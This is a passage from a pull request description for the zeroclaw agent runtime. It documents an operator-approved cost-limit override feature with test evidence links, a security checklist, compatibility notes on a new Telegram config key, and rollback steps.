  - **Narrow pane:** in a pane about 42 columns wide, [Stop and Override stack on separate rows](https://raw.githubusercontent.com/Audacity88/zeroclaw/evidence-screenshots/pr-11589/live-d01ad8eb1/11589-L09-narrow-pane-stacked-buttons-42col.png), and [clicking the stacked Override continues the turn](https://raw.githubusercontent.com/Audacity88/zeroclaw/evidence-screenshots/pr-11589/live-d01ad8eb1/11589-L10-narrow-pane-override-click-continues-42col.png).
  - Earlier macOS screenshots of `ab919d606c`: https://github.com/zeroclaw-labs/zeroclaw/pull/11589#issuecomment-6514704152. Earlier build: https://github.com/zeroclaw-labs/zeroclaw/pull/11589#issuecomment-6160109618.
- **Tested revision, interface, and evidence path:** head `2cd669c27` for the ZeroCode tests; `d01ad8eb1ad9` for the runtime tests and the live run above (ZeroCode Chat pane over local RPC, `zeroclaw daemon`). Older local runs on `225c52bb636f` (master `f12da7462a0f`, remote macOS arm64 builder). Earlier live run: experiment build https://github.com/Audacity88/zeroclaw/tree/experiment/zerocode-builds/20261013T015950Z-b89c9e407c42.
- **Screenshot or exact-output evidence:** the captures, trace lines (`trace-child-refusal.jsonl`, `trace-grant.jsonl`), stub request log and config excerpt are all in the manifest folder linked above.
- **If any command was intentionally skipped, why:** full crate suites not run locally; CI runs them.

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? No (grants are memory-only; no new file is written)
- New external network calls? No
- Secrets / tokens / credentials handling changed? No
- PII, real identities, or personal data in diff, tests, fixtures, or docs? No
- Prompt injection or untrusted model-visible text introduced/changed? No
- If any `Yes`, describe the risk and mitigation: N/A. The override is off by default and only an operator answer grants it; a runtime timeout or unreachable client does not.

## Compatibility (required)

- Backward compatible? Yes. With `allow_override = false` (the default) behaviour is unchanged.
- Config / env / CLI surface changed? Yes: one new key, `channels.telegram.<alias>.cost_override_operators` (numeric Telegram user IDs allowed to override in group chats; defaults to empty, which denies group overrides; no wildcards or usernames). Also one new RPC `session/update` type, `approval_withdrawn`, which older clients ignore; `allow_override` now does what its docs say, and the docs are corrected.
- Rust/MSRV/toolchain floor changed? No

## Rollback (required for medium/high-risk PRs)

- **Fast rollback command/path:** After squash merge, `git revert <squash-commit>`. Before merge, the branch's own commits run `a8857fb9b1` to `d0297b2c4`, plus `2cd669c27`, and the head is `2cd669c27`. Don't revert its master merges.
- **Feature flags or config toggles:** `cost.allow_override = false` restores the hard stop without a revert.
- **Observable failure symptoms:** turns stuck waiting at the limit; grep the runtime trace for `cost limit overridden by the operator` and `cost limit override prompt failed`.
